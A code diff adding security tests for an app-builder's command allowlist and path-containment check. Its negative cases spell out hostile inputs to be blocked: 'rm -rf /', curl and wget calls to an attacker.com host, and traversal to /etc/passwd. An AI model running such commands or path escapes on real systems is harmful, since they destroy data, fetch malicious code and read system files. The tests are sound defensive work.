@@ -6,6 +6,7 @@
 
 import { classifyTask } from './task-classifier.ts';
 import type { AppStory } from './types.ts';
+import { isCommandSafe, resolvePath } from './build-tools.ts';
 
 let passed = 0;
 let failed = 0;
@@ -223,6 +224,68 @@ test('testing + auth but no db → full-app', () => {
         auth: { provider: 'firebase' },
     }));
     assert(p.type === 'full-app', `expected full-app, got ${p.type}`);
+});
+
+// ─── Security & Containment Tests ────────────────────────
+console.log('\n🛡️ Security & Containment:');
+
+test('command execution allowlist', () => {
+    assert(isCommandSafe('npm install') === true, 'npm install should be safe');
+    assert(isCommandSafe('npx tsc --noEmit') === true, 'npx tsc should be safe');
+    assert(isCommandSafe('npm run test && npx eslint') === true, 'chained safe commands should be safe');
+    assert(isCommandSafe('git status') === true, 'git should be safe');
+    assert(isCommandSafe('./node_modules/.bin/vitest') === true, 'local node_modules binary of allowed tool should be safe');
+
+    assert(isCommandSafe('rm -rf /') === false, 'rm should be blocked');
+    assert(isCommandSafe('curl http://attacker.com/malicious.sh') === false, 'curl should be blocked');
+    assert(isCommandSafe('npm install && wget http://attacker.com') === false, 'chained unsafe commands should be blocked');
+});
+
+test('resolvePath containment enforcement', () => {
+    const mockCtx = {
+        targetDir: '/Users/pretheesh/Projects/factory/greeting-app',
+        storyFile: '',
+        terminal: false,
+        success: false,
+        generatedFiles: new Map(),
+        logs: [],
+    };
+
+    // Valid paths
+    assert(
+        resolvePath('src/app.ts', mockCtx) === '/Users/pretheesh/Projects/factory/greeting-app/src/app.ts',
+        'relative path should resolve correctly under targetDir'
+    );
+    assert(
+        resolvePath('.', mockCtx) === '/Users/pretheesh/Projects/factory/greeting-app',
+        'dot path should resolve to targetDir'
+    );
+    assert(
+        resolvePath('/Users/pretheesh/Projects/factory/greeting-app/nested/file.ts', mockCtx) === '/Users/pretheesh/Projects/factory/greeting-app/nested/file.ts',
+        'absolute nested path under targetDir should be allowed'
+    );
+
+    // Escape/Traversal attempts
+    try {
+        resolvePath('../../etc/passwd', mockCtx);
+        throw new Error('should have thrown on parent directory traversal escape');
+    } catch (e: any) {
+        assert(e.message.includes('Security Error'), 'expected security error for parent traversal');
+    }
+
+    try {
+        resolvePath('/etc/passwd', mockCtx);
+        throw new Error('should have thrown on absolute path escape');
+    } catch (e: any) {
+        assert(e.message.includes('Security Error'), 'expected security error for absolute escape');
+    }
+
+    try {
+        resolvePath('/Users/pretheesh/Projects/factory/greeting-app-sibling', mockCtx);
+        throw new Error('should have thrown on partial name sibling directory traversal');
+    } catch (e: any) {
+        assert(e.message.includes('Security Error'), 'expected security error for partial sibling escape');
+    }
 });
 
 // ─── Summary ─────────────────────────────────────────────
